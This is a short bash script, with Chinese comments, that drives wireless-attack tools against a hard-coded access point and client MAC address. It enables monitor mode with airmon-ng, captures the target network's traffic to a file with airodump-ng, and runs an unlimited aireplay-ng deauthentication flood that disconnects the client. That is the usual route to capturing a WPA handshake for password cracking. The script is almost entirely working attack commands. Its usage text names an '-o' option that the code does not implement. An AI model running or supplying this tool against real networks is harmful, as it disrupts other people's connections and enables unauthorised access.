#!/bin/bash


wifi_name=wlp6s0
mac1=62:1A:FC:33:DF:CD
mac2=8A:90:3D:74:2B:EB

function usage() {
    echo "用法："
    echo "  $0 -o"
    echo "  -o  执行命令"
    echo "  "   
    echo "  "
    echo "  "
    echo
}


function iwlist(){
    sudo iwlist $wifi_name scanning
}

function nmcli(){
    sudo nmcli device wifi list
}

function start_air(){
    sudo airmon-ng start $wifi_name
}

function stop_air(){
    sudo airmon-ng stop ${wifi_name}mon
}

function dump_air(){
    echo ${wifi_name}mon
    sudo airodump-ng  ${wifi_name}mon | tee -a list.txt
}

function save_air(){
    echo ${wifi_name}mon
    sudo airodump-ng -w android -c 6 --bssid $mac1 ${wifi_name}mon
}

function play_air(){
    echo ${wifi_name}mon
    sudo aireplay-ng -0 0 -a $mac1 -c $mac2 ${wifi_name}mon
}

function tcpdump_(){
    #sudo ifconfig $wifi_name down   # 关闭网卡
    #sudo iwconfig $wifi_name mode monitor  # 设置成监控模式
    #sudo ifconfig $wifi_name up     # 开启网卡
    #sudo tcpdump -i ${wifi_name}mon -n -e
    sudo tcpdump -i ${wifi_name}mon type mgt subtype assoc-req -e
}


if [ $# -lt 1 ];then
    usage
elif [ $1 == '1' ];then
    iwlist
elif [ $1 == '2' ];then
    nmcli
elif [ $1 == '3' ];then
    start_air
elif [ $1 == '4' ];then
    dump_air
elif [ $1 == '5' ];then
    save_air
elif [ $1 == '6' ];then
    play_air
elif [ $1 == '7' ];then
    stop_air
else
    usage
fi